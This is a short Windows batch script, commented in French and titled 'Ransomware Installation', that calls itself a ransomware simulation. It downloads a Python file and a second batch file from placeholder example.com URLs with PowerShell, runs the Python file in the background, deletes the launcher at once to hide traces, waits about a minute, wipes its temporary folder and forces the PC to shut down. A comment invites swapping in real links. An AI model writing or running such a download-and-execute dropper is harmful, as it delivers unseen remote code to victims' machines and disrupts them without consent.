@echo off
title Ransomware Installation

REM Définir les URLs des fichiers (remplace par tes liens réels)
set MAIN_URL=https://example.com/main.py
set RUN_URL=https://example.com/run.bat

REM Créer un dossier temporaire
set TEMP_DIR=%TEMP%\RansomSim
mkdir %TEMP_DIR% 2>nul

REM Télécharger les fichiers avec PowerShell
echo Téléchargement des fichiers...
powershell -Command "Invoke-WebRequest -Uri %MAIN_URL% -OutFile %TEMP_DIR%\main.py"
powershell -Command "Invoke-WebRequest -Uri %RUN_URL% -OutFile %TEMP_DIR%\run.bat"

REM Créer un fichier marqueur pour détecter la fermeture
echo Running > %TEMP_DIR%\running.txt

REM Lancer main.py et supprimer run.bat immédiatement après
echo Lancement de la simulation...
start /b cmd /c "%TEMP_DIR%\main.py" && del /f /q %TEMP_DIR%\run.bat

REM Attendre la fin (timeout de 1 minute + 5 sec)
timeout /t 65 /nobreak >nul

REM Nettoyage et arrêt si pas de fermeture anormale
if exist %TEMP_DIR%\running.txt (
    echo Nettoyage en cours...
    rmdir /S /Q %TEMP_DIR% 2>nul
    echo Arrêt du PC dans 5 secondes...
    shutdown /s /t 5
)
